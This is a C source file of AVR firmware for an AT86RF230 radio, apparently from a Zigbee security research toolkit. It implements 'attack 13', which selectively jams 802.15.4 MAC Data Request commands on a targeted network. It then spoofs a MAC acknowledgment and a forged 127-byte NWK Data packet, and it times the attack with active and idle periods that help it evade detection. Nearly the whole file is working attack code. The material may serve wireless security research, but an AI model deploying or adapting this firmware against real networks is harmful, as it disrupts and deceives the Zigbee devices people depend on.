/*
 * fw/attacks/attack_13.c - Attack function with ID 13
 *
 * Written 2021 by Dimitrios-Georgios Akestoridis
 * Copyright 2021 Dimitrios-Georgios Akestoridis
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 */

#include <stdbool.h>
#include <stdint.h>

#include <avr/io.h>
#include <avr/interrupt.h>

#define F_CPU 8000000UL
#include <util/delay.h>

#include "at86rf230.h"
#include "spi.h"
#include "board.h"
#include "attack.h"
#include "attack_13.h"


static bool timer_started = 0;
static bool idle_period = 1;
static bool wait_period = 0;
static uint8_t ticks_per_8ms = 0;
static uint32_t elapsed_seconds = 0;
static uint32_t last_activity = 0;


void start_timer(void)
{
	/* Reset the number of 8-millisecond ticks */
	ticks_per_8ms = 0;

	/* Reset the elapsed seconds counter */
	elapsed_seconds = 0;

	/*
	 * Reset the Counter Register of timer 0
	 * and its Output Compare Register A
	 */
	TCNT0 = 0;
	OCR0A = 250;

	/*
	 * Configure timer 0 to operate in CTC mode
	 * with a prescale factor of 256
	 */
	TCCR0A = 1 << WGM01;
	TCCR0B = 1 << CS02;

	/* Enable the Output Compare Match A interrupt */
	TIMSK0 = 1 << OCIE0A;
}


/*
 * Jam only certain 12-byte MAC commands of a specified network
 * that request a MAC acknowledgment
 * and then spoof a MAC acknowledgment
 * followed by a 127-byte NWK Data packet,
 * according to specified active and idle time intervals,
 * with the active period restarting whenever
 * a period of inactivity is observed
 * and the idle period restarting whenever
 * certain packet types are observed
 */
bool attack(void)
{
	uint8_t rx_byte = 0;
	uint8_t phy_len = 0;
	uint8_t mac_seq_num = 0;
	uint8_t mac_dst_0 = 0;
	uint8_t mac_dst_1 = 0;
	uint8_t mac_src_0 = 0;
	uint8_t mac_src_1 = 0;

	/* Read the received packet as soon as possible */
	spi_begin();
	spi_io(AT86RF230_BUF_READ);

	/* Make sure that the timer has started */
	if (!timer_started) {
		/* Start the timer and ignore the received packet */
		timer_started = 1;
		start_timer();
		spi_end();
		return 1;
	}

	/* Check the length of the received packet */
	phy_len = spi_recv();
	if ((phy_len < 5) || (phy_len & 0x80)) {
		/* Ignore packets with invalid length */
		spi_end();
		return 1;
	} else if (phy_len != 12) {
		/*
		 * Check whether the idle period should restart
		 * due to an observed packet whose length does not match
		 * the typical length of Data Requests or not
		 */
		_delay_us(32);
		rx_byte = spi_recv();
		if ((rx_byte & 0x07) == 0x01) {
			/*
			 * Check the 8 least-significant bits
			 * of the MAC Frame Control
			 * of a MAC Data packet
			 */
			if (rx_byte & 0x08) {
				/*
				 * Ignore packets with MAC Security enabled
				 */
				spi_end();
				return 1;
			} else if (!(rx_byte & 0x40)) {
				/*
				 * Ignore packets that
				 * do not compress the PAN ID
				 */
				spi_end();
				return 1;
			}

			/*
			 * Check the 8 most-significant bits
			 * of the MAC Frame Control
			 * of a MAC Data packet
			 */
			_delay_us(32);
			rx_byte = spi_recv();
			if (rx_byte & 0x30) {
				/*
				 * Ignore packets that do not use the
				 * IEEE 802.15.4-2003 frame version
				 */
				spi_end();
				return 1;
			} else if ((rx_byte & 0x0c) != 0x08) {
				/*
				 * Ignore packets that do not use
				 * a short address for the destination node
				 * on the MAC layer
				 */
				spi_end();
				return 1;
			} else if ((rx_byte & 0xc0) != 0x80) {
				/*
				 * Ignore packets that do not use
				 * a short address for the source node
				 * on the MAC layer
				 */
				spi_end();
				return 1;
			}

			/* Ignore the MAC sequence number */
			_delay_us(32);
			spi_recv();

			/* Check the destination PAN ID */
			_delay_us(32);
			if (spi_recv() != (PANID & 0xff)) {
				/*
				 * Ignore packets that are
				 * destined for a different network
				 */
				spi_end();
				return 1;
			}
			_delay_us(32);
			if (spi_recv() != ((PANID >> 8) & 0xff)) {
				/*
				 * Ignore packets that are
				 * destined for a different network
				 */
				spi_end();
				return 1;
			}

			/* Store the MAC destination address */
			_delay_us(32);
			mac_dst_0 = spi_recv();
			_delay_us(32);
			mac_dst_1 = spi_recv();

			/* Store the MAC source address */
			_delay_us(32);
			mac_src_0 = spi_recv();
			_delay_us(32);
			mac_src_1 = spi_recv();

			/* Check the MAC destination and source addresses */
			if ((mac_dst_0 != (SHORTDSTADDR & 0xff)
			     || mac_dst_1 != ((SHORTDSTADDR >> 8) & 0xff))
			    && (mac_src_0 != (SHORTDSTADDR & 0xff)
			     || mac_src_1 != ((SHORTDSTADDR >> 8) & 0xff))) {
				/*
				 * Ignore packets that are not received
				 * or transmitted by the child node
				 */
				spi_end();
				return 1;
			}

			/*
			 * Check the 8 least-significant bits
			 * of the NWK Frame Control to determine
			 * whether this is a NWK Command packet or not
			 */
			_delay_us(32);
			if ((spi_recv() & 0x03) == 0x01) {
				/* Reset the number of 8-millisecond ticks */
				ticks_per_8ms = 0;

				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Check the duration of the idle period */
				if (IDLESEC > 0) {
					/*
					 * Indicate that the idle period began
					 */
					idle_period = 1;
					wait_period = 0;
				}
			}
		} else if ((rx_byte & 0x07) == 0x03) {
			/*
			 * Check the 8 least-significant bits
			 * of the MAC Frame Control
			 * of a MAC Command packet
			 */
			if (rx_byte & 0x08) {
				/*
				 * Ignore packets with MAC Security enabled
				 */
				spi_end();
				return 1;
			} else if (!(rx_byte & 0x20)) {
				/*
				 * Ignore packets that
				 * do not request a MAC acknowledgment
				 */
				spi_end();
				return 1;
			} else if (rx_byte & 0x40) {
				/*
				 * Ignore packets that
				 * compress the PAN ID
				 */
				spi_end();
				return 1;
			}

			/*
			 * Check the 8 most-significant bits
			 * of the MAC Frame Control
			 * of a MAC Command packet
			 */
			_delay_us(32);
			rx_byte = spi_recv();
			if (rx_byte & 0x30) {
				/*
				 * Ignore packets that do not use the
				 * IEEE 802.15.4-2003 frame version
				 */
				spi_end();
				return 1;
			} else if ((rx_byte & 0x0c) != 0x08) {
				/*
				 * Ignore packets that do not use
				 * a short address for the destination node
				 * on the MAC layer
				 */
				spi_end();
				return 1;
			} else if ((rx_byte & 0xc0) != 0xc0) {
				/*
				 * Ignore packets that do not use
				 * an extended address for the source node
				 * on the MAC layer
				 */
				spi_end();
				return 1;
			}

			/* Ignore the MAC sequence number */
			_delay_us(32);
			spi_recv();

			/* Check the destination PAN ID */
			_delay_us(32);
			if (spi_recv() != (PANID & 0xff)) {
				/*
				 * Ignore packets that are
				 * destined for a different network
				 */
				spi_end();
				return 1;
			}
			_delay_us(32);
			if (spi_recv() != ((PANID >> 8) & 0xff)) {
				/*
				 * Ignore packets that are
				 * destined for a different network
				 */
				spi_end();
				return 1;
			}

			/* Ignore the MAC destination address */
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();

			/* Check the source PAN ID */
			_delay_us(32);
			if (spi_recv() != 0xff) {
				/*
				 * Ignore packets that are not using
				 * the broadcast PAN ID as their source
				 */
				spi_end();
				return 1;
			}
			_delay_us(32);
			if (spi_recv() != 0xff) {
				/*
				 * Ignore packets that are not using
				 * the broadcast PAN ID as their source
				 */
				spi_end();
				return 1;
			}

			/* Ignore the MAC source address */
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();
			_delay_us(32);
			spi_recv();

			/*
			 * Check whether this is an Association Request or not
			 */
			_delay_us(32);
			if (spi_recv() == 0x01) {
				/* Reset the number of 8-millisecond ticks */
				ticks_per_8ms = 0;

				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Check the duration of the idle period */
				if (IDLESEC > 0) {
					/*
					 * Indicate that the idle period began
					 */
					idle_period = 1;
					wait_period = 0;
				}
			}
		}

		/*
		 * Do not interfere with the transmission of packets whose
		 * length does not match the typical length of Data Requests
		 */
		spi_end();
		return 1;
	}

	/* Check the 8 least-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if ((rx_byte & 0x07) != 0x03) {
		/* Ignore packets that are not MAC Command packets */
		spi_end();
		return 1;
	} else if (rx_byte & 0x08) {
		/* Ignore packets with MAC Security enabled */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x20)) {
		/* Ignore packets that do not request a MAC acknowledgment */
		spi_end();
		return 1;
	} else if (!(rx_byte & 0x40)) {
		/* Ignore packets that do not compress the PAN ID */
		spi_end();
		return 1;
	}

	/* Check the 8 most-significant bits of the MAC Frame Control */
	_delay_us(32);
	rx_byte = spi_recv();
	if (rx_byte & 0x30) {
		/*
		 * Ignore packets that do not use the
		 * IEEE 802.15.4-2003 frame version
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0x0c) != 0x08) {
		/*
		 * Ignore packets that do not use a short address
		 * for the destination node on the MAC layer
		 */
		spi_end();
		return 1;
	} else if ((rx_byte & 0xc0) != 0x80) {
		/*
		 * Ignore packets that do not use a short address
		 * for the source node on the MAC layer
		 */
		spi_end();
		return 1;
	}

	/* Store the MAC sequence number */
	_delay_us(32);
	mac_seq_num = spi_recv();

	/* Check the destination PAN ID */
	_delay_us(32);
	if (spi_recv() != (PANID & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}
	_delay_us(32);
	if (spi_recv() != ((PANID >> 8) & 0xff)) {
		/*
		 * Ignore packets that are
		 * destined for a different network
		 */
		spi_end();
		return 1;
	}

	/* Determine whether to proceed or not */
	if (idle_period) {
		/* Do not proceed during an idle period */
		spi_end();
		return 1;
	} else if (wait_period) {
		/* Reset the number of 8-millisecond ticks */
		ticks_per_8ms = 0;

		/* Reset the elapsed seconds counter */
		elapsed_seconds = 0;

		/* Reset the relative time of the last activity */
		last_activity = 0;

		/* Check the duration of the active period */
		if (ACTIVESEC > 0) {
			/* Indicate that the active period began */
			wait_period = 0;
		} else {
			/* Do not proceed if there is no active period */
			spi_end();
			return 1;
		}
	}

	/* Check whether a period of inactivity passed or not */
	if (elapsed_seconds - last_activity > IDLESEC) {
		/* Restart the active period */
		ticks_per_8ms = 0;
		elapsed_seconds = 0;
		last_activity = 0;
	} else {
		/* Update the relative time of the last activity */
		last_activity = elapsed_seconds;
	}

	/* Stop receiving and transition into the PLL_ON state */
	spi_end();
#if defined(AT86RF231) || defined(AT86RF212)
	reg_write(REG_TRX_STATE, TRX_CMD_FORCE_PLL_ON);
#elif defined(AT86RF230)
	reg_write(REG_TRX_STATE, TRX_CMD_PLL_ON);
#else
#error "Unknown transceiver"
#endif

	/* Jam the received packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(1);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed MAC acknowledgment */
	_delay_us(272);

	/* Spoof a MAC acknowledgment */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(5);
	spi_send(0x12);
	spi_send(0x00);
	spi_send(mac_seq_num);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Wait for the transmission of the spoofed NWK Data packet */
	_delay_us(400);

	/* Spoof a NWK Data packet */
	spi_begin();
	spi_send(AT86RF230_BUF_WRITE);
	spi_send(127);
	spi_send(0x71);
	spi_send(0x88);
	spi_send(0xff);
	spi_send(PANID & 0xff);
	spi_send((PANID >> 8) & 0xff);
	spi_send(SHORTDSTADDR & 0xff);
	spi_send((SHORTDSTADDR >> 8) & 0xff);
	spi_send(SHORTSRCADDR & 0xff);
	spi_send((SHORTSRCADDR >> 8) & 0xff);
	spi_send(0x08);
	spi_send(0x02);
	spi_send(SHORTDSTADDR & 0xff);
	spi_send((SHORTDSTADDR >> 8) & 0xff);
	spi_send(SHORTSRCADDR & 0xff);
	spi_send((SHORTSRCADDR >> 8) & 0xff);
	spi_send(0x1e);
	spi_send(0xff);
	spi_send(0x28);
	spi_send(FRAMECOUNTER & 0xff);
	spi_send((FRAMECOUNTER >> 8) & 0xff);
	spi_send((FRAMECOUNTER >> 16) & 0xff);
	spi_send((FRAMECOUNTER >> 24) & 0xff);
	spi_send(EXTENDEDSRCADDR & 0xff);
	spi_send((EXTENDEDSRCADDR >> 8) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 16) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 24) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 32) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 40) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 48) & 0xff);
	spi_send((EXTENDEDSRCADDR >> 56) & 0xff);
	spi_send(KEYSEQNUM);
	spi_end();

	/* Transition into the BUSY_TX state */
	slp_tr();

	/* Transition into the RX_ON state */
	change_state(TRX_CMD_RX_ON);

	return 1;
}


ISR(TIMER0_COMPA_vect)
{
	/* Update the number of 8-millisecond ticks */
	ticks_per_8ms++;

	/* Check whether a second has passed */
	if (ticks_per_8ms == 125) {
		/* Reset the number of 8-millisecond ticks */
		ticks_per_8ms = 0;

		/* Update the elapsed seconds counter */
		elapsed_seconds++;

		/* Check for potential period transitions */
		if (idle_period) {
			/* Determine whether the idle period ended or not */
			if (elapsed_seconds >= IDLESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Indicate that the wait period began */
				idle_period = 0;
				wait_period = 1;
			}
		} else if (!wait_period) {
			/* Determine whether the active period ended or not */
			if (elapsed_seconds - last_activity > IDLESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Restart the wait period */
				wait_period = 1;
			} else if (elapsed_seconds >= ACTIVESEC) {
				/* Reset the elapsed seconds counter */
				elapsed_seconds = 0;

				/* Check the duration of the idle period */
				if (IDLESEC > 0) {
					/* Indicate that the idle period began */
					idle_period = 1;
					wait_period = 0;
				}
			}
		}
	}
}
